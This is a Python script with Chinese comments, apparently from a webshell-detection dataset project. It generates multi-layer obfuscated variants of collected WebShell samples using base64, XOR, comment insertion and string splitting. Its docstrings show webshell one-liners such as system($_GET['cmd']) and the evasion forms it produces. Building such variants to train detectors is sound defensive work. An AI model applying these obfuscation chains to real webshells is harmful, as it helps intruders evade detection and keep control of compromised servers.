"""
T2.3 · 多层组合混淆变种生成脚本

对原始 WebShell 样本应用 2 种混淆技术的组合，生成多层混淆变种。
所有操作仅做静态文本处理，禁止执行任何代码。

组合混淆技术：
  1. base64 + comment_bypass: base64 编码后对函数名插入注释绕过
  2. base64 + string_split: base64 编码后对函数名进行字符串分割
  3. xor + comment_bypass: XOR 编码后对函数名插入注释绕过
  4. string_split + comment_bypass: 字符串分割后再插入注释绕过
  5. base64 + xor: 双重编码（base64 编码 XOR 解码器）

使用方式：
    python scripts/generate_combined_obfuscated.py
    python scripts/generate_combined_obfuscated.py --max-per-sample 1
"""

import os
import sys
import base64
import random
import logging
import re

# 将项目根目录加入 sys.path
project_root = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, project_root)

# 导入单层混淆函数
from scripts.generate_obfuscated import (
    obfuscate_base64_php,
    obfuscate_base64_python,
    obfuscate_comment_bypass_php,
    obfuscate_comment_bypass_python,
    obfuscate_string_split_php,
    obfuscate_string_split_python,
    obfuscate_xor_php,
    obfuscate_xor_python,
    detect_language,
)

# 日志配置
logging.basicConfig(
    level=logging.INFO,
    format="  %(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
logger = logging.getLogger(__name__)

# 输入目录：原始 WebShell 样本
WEBSHELL_DIR = os.path.join(project_root, "data", "samples", "webshell")

# 输出目录：组合混淆变种
COMBINED_DIR = os.path.join(project_root, "data", "samples", "obfuscated", "combined")

# 5 种组合混淆技术的子目录
COMBINED_TECHNIQUE_DIRS = {
    "base64_comment": os.path.join(COMBINED_DIR, "base64_comment"),
    "base64_string_split": os.path.join(COMBINED_DIR, "base64_string_split"),
    "xor_comment": os.path.join(COMBINED_DIR, "xor_comment"),
    "string_split_comment": os.path.join(COMBINED_DIR, "string_split_comment"),
    "base64_xor": os.path.join(COMBINED_DIR, "base64_xor"),
}

# 固定随机种子保证可复现
random.seed(42)


# ============================================================
# 组合混淆 1: base64 + comment_bypass
# ============================================================

def combine_base64_comment_php(code: str) -> str:
    """
    PHP 组合混淆：先 base64 编码，再对函数名插入注释绕过。

    示例：
      原始: <?php system($_GET['cmd']); ?>
      base64: <?php eval(base64_decode('...')); ?>
      组合: <?php ev/**/al(base64/**/_decode('...')); ?>
    """
    # 第一步：base64 编码
    step1 = obfuscate_base64_php(code)
    # 第二步：对 base64 编码后的代码应用注释绕过
    step2 = obfuscate_comment_bypass_php(step1)
    return step2


def combine_base64_comment_python(code: str) -> str:
    """
    Python 组合混淆：先 base64 编码，再对函数名插入注释绕过。
    """
    step1 = obfuscate_base64_python(code)
    step2 = obfuscate_comment_bypass_python(step1)
    return step2


# ============================================================
# 组合混淆 2: base64 + string_split
# ============================================================

def combine_base64_string_split_php(code: str) -> str:
    """
    PHP 组合混淆：先 base64 编码，再对函数名进行字符串分割。

    示例：
      原始: <?php system($_GET['cmd']); ?>
      base64: <?php eval(base64_decode('...')); ?>
      组合: <?php ('ev'.'al')(base64_decode('...')); ?>
    """
    step1 = obfuscate_base64_php(code)
    step2 = obfuscate_string_split_php(step1)
    return step2


def combine_base64_string_split_python(code: str) -> str:
    """
    Python 组合混淆：先 base64 编码，再对函数名进行字符串分割。
    """
    step1 = obfuscate_base64_python(code)
    step2 = obfuscate_string_split_python(step1)
    return step2


# ============================================================
# 组合混淆 3: xor + comment_bypass
# ============================================================

def combine_xor_comment_php(code: str) -> str:
    """
    PHP 组合混淆：先 XOR 编码，再对 eval 函数名插入注释绕过。

    示例：
      原始: <?php system('whoami'); ?>
      xor: <?php $k='key';$c="\x01...";eval($c^str_repeat($k,strlen($c))); ?>
      组合: <?php $k='key';$c="\x01...";ev/**/al($c^str_repeat($k,strlen($c))); ?>
    """
    step1 = obfuscate_xor_php(code)
    step2 = obfuscate_comment_bypass_php(step1)
    return step2


def combine_xor_comment_python(code: str) -> str:
    """
    Python 组合混淆：先 XOR 编码，再对 exec 函数名插入注释绕过。
    """
    step1 = obfuscate_xor_python(code)
    step2 = obfuscate_comment_bypass_python(step1)
    return step2


# ============================================================
# 组合混淆 4: string_split + comment_bypass
# ============================================================

def combine_string_split_comment_php(code: str) -> str:
    """
    PHP 组合混淆：先字符串分割，再对未分割的关键字插入注释绕过。

    示例：
      原始: <?php system($_GET['cmd']); ?>
      string_split: <?php ('sy'.'stem')($_GET['cmd']); ?>
      组合: <?php ('sy'.'st'.'em')($_GET['cm'.'d']); ?>
    """
    step1 = obfuscate_string_split_php(code)
    step2 = obfuscate_comment_bypass_php(step1)
    return step2


def combine_string_split_comment_python(code: str) -> str:
    """
    Python 组合混淆：先字符串分割，再插入注释绕过。
    """
    step1 = obfuscate_string_split_python(code)
    step2 = obfuscate_comment_bypass_python(step1)
    return step2


# ============================================================
# 组合混淆 5: base64 + xor (双重编码)
# ============================================================

def combine_base64_xor_php(code: str) -> str:
    """
    PHP 组合混淆：对 base64 解码器进行 XOR 编码。

    先将原始代码 base64 编码，再将 base64_decode+eval 的解码器
    进行 XOR 编码，实现双重混淆。

    示例：
      原始: <?php system('whoami'); ?>
      双重: <?php $k='key';$c="\x01...";eval($c^str_repeat($k,strlen($c))); ?>
      其中 $c 解码后为: eval(base64_decode('...'));
    """
    # 第一步：base64 编码原始代码
    inner = code
    inner = re.sub(r'^\s*<\?php\s*', '', inner)
    inner = re.sub(r'^\s*<\?\s*', '', inner)
    inner = re.sub(r'\?>\s*$', '', inner)
    inner = inner.strip()

    if not inner:
        return code

    # 构造 base64 解码执行代码
    encoded = base64.b64encode(inner.encode("utf-8")).decode("ascii")
    decoder_code = f"eval(base64_decode('{encoded}'));"

    # 第二步：对解码器代码进行 XOR 编码
    key = b"k3y"
    xor_encoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(decoder_code.encode("utf-8")))
    hex_encoded = ''.join(f'\\x{b:02x}' for b in xor_encoded)

    return (
        f"<?php $k='{key.decode()}';"
        f"$c=\"{hex_encoded}\";"
        f"eval($c^str_repeat($k,strlen($c))); ?>"
    )


def combine_base64_xor_python(code: str) -> str:
    """
    Python 组合混淆：对 base64 解码器进行 XOR 编码。
    """
    # 第一步：base64 编码原始代码
    encoded = base64.b64encode(code.encode("utf-8")).decode("ascii")
    decoder_code = f"import base64;exec(base64.b64decode('{encoded}'))"

    # 第二步：对解码器代码进行 XOR 编码
    key = b"k3y"
    xor_encoded = bytes(b ^ key[i % len(key)] for i, b in enumerate(decoder_code.encode("utf-8")))
    hex_encoded = ''.join(f'\\x{b:02x}' for b in xor_encoded)

    return (
        f"k=b'{key.decode()}';"
        f"c=b'{hex_encoded}';"
        f"exec(bytes(c[i]^k[i%len(k)]for i in range(len(c))))"
    )


# ============================================================
# 主逻辑
# ============================================================

COMBINED_TECHNIQUES = {
    "base64_comment": {
        "php": combine_base64_comment_php,
        "python": combine_base64_comment_python,
    },
    "base64_string_split": {
        "php": combine_base64_string_split_php,
        "python": combine_base64_string_split_python,
    },
    "xor_comment": {
        "php": combine_xor_comment_php,
        "python": combine_xor_comment_python,
    },
    "string_split_comment": {
        "php": combine_string_split_comment_php,
        "python": combine_string_split_comment_python,
    },
    "base64_xor": {
        "php": combine_base64_xor_php,
        "python": combine_base64_xor_python,
    },
}

TECHNIQUE_LABELS = {
    "base64_comment": "Base64+注释绕过",
    "base64_string_split": "Base64+字符串分割",
    "xor_comment": "XOR+注释绕过",
    "string_split_comment": "字符串分割+注释绕过",
    "base64_xor": "Base64+XOR双重编码",
}


def main():
    import argparse

    parser = argparse.ArgumentParser(description="T2.3 · 多层组合混淆变种生成")
    parser.add_argument(
        "--max-per-sample", type=int, default=1,
        help="每种组合技术对每个样本生成的变种数（默认1）"
    )
    args = parser.parse_args()

    print("=" * 60)
    print("  T2.3 · 多层组合混淆变种生成")
    print("  [安全提示] 仅做静态文本处理，禁止执行任何代码")
    print("=" * 60)

    # 创建输出目录
    for tech, dir_path in COMBINED_TECHNIQUE_DIRS.items():
        os.makedirs(dir_path, exist_ok=True)

    # 检查输入目录
    if not os.path.exists(WEBSHELL_DIR):
        print(f"  [错误] WebShell 目录不存在: {WEBSHELL_DIR}")
        sys.exit(1)

    # 收集所有 WebShell 样本
    samples = []
    for fname in os.listdir(WEBSHELL_DIR):
        fpath = os.path.join(WEBSHELL_DIR, fname)
        if os.path.isfile(fpath) and not fname.startswith("."):
            samples.append(fpath)

    print(f"\n  发现 {len(samples)} 个原始 WebShell 样本")

    if not samples:
        print("  [警告] 没有找到 WebShell 样本，请先运行 collect_malicious.py")
        sys.exit(1)

    total_generated = 0
    stats = {tech: 0 for tech in COMBINED_TECHNIQUES}

    for sample_path in samples:
        fname = os.path.basename(sample_path)
        language = detect_language(fname)

        # 只处理 PHP 和 Python
        if language not in ("php", "python"):
            continue

        # 读取样本内容
        try:
            with open(sample_path, "r", encoding="utf-8", errors="ignore") as f:
                code = f.read()
        except Exception as e:
            logger.warning(f"读取失败 {fname}: {e}")
            continue

        if not code.strip():
            continue

        # 样本基础名（不含扩展名）
        base_name = os.path.splitext(fname)[0]
        ext = os.path.splitext(fname)[1]

        # 对每种组合混淆技术生成变种
        for tech_name, func_map in COMBINED_TECHNIQUES.items():
            obfuscate_func = func_map.get(language)
            if obfuscate_func is None:
                continue

            try:
                obfuscated = obfuscate_func(code)
            except Exception as e:
                logger.warning(f"混淆失败 {fname} + {tech_name}: {e}")
                continue

            if obfuscated is None or obfuscated == code:
                logger.warning(f"混淆无变化: {fname} + {tech_name}")
                continue

            # 生成输出文件名
            output_fname = f"{base_name}_{tech_name}{ext}"
            output_path = os.path.join(COMBINED_TECHNIQUE_DIRS[tech_name], output_fname)

            try:
                with open(output_path, "w", encoding="utf-8") as f:
                    f.write(obfuscated)
                stats[tech_name] += 1
                total_generated += 1
            except Exception as e:
                logger.warning(f"写入失败 {output_fname}: {e}")

    # 汇总
    print(f"\n{'='*60}")
    print("  多层组合混淆变种生成完成")
    print(f"{'='*60}")
    for tech_name in COMBINED_TECHNIQUES:
        label = TECHNIQUE_LABELS[tech_name]
        count = stats[tech_name]
        print(f"  {label:25s} ({tech_name:25s}): {count:4d} 个")
    print(f"  {'─'*60}")
    print(f"  {'总计':25s}{'':25s}: {total_generated:4d} 个")
    print(f"\n  输出目录: {COMBINED_DIR}")

    # 打印各子目录
    for tech_name, dir_path in COMBINED_TECHNIQUE_DIRS.items():
        print(f"    {tech_name:25s}: {dir_path}")


if __name__ == "__main__":
    main()
